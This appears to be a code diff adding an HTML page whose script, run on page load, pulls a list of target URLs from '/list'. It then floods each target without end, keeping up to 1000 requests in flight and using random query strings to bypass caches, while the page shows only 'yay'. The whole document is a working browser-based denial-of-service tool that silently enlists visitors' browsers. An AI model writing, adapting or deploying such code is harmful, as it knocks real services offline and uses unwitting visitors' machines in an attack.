@@ -1,0 +1,68 @@
+<html>
+
+<head>
+  <script>
+    let list = [];
+    const CONCURRENCY_LIMIT = 1000;
+
+    fetch('/list')
+      .then(response => response.json())
+      .then(data => {
+        list = data;
+        start();
+      });
+
+    let urls = {};
+    let queue = [];
+
+    function start() {
+      list.forEach(flood);
+    }
+
+    async function fetchWithTimeout(url) {
+      const controller = new AbortController();
+      const id = setTimeout(() => controller.abort(), 1000);
+      return fetch(url, {
+        signal: controller.signal
+      }).then((response) => {
+        clearTimeout(id);
+        return response;
+      }).catch((error) => {
+        clearTimeout(id);
+        throw error;
+      });
+    }
+
+    async function flood(url) {
+      for (let i = 0;; ++i) {
+        if (queue.length > CONCURRENCY_LIMIT) {
+          await queue.shift()
+        }
+        rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000));
+        urls[url] = urls[url] || {};
+        queue.push(fetchWithTimeout(url + rand)
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */ ) {
+              return;
+            }
+            urls[url].number_of_errored_responses++;
+            urls[url].error_message = error.message
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              urls[url].number_of_errored_responses++;
+              urls[url].error_message = response.statusText
+            }
+            urls[url].number_of_requests++;
+          })
+        )
+      }
+    }
+  </script>
+</head>
+
+<body>
+  yay
+</body>
+
+</html>
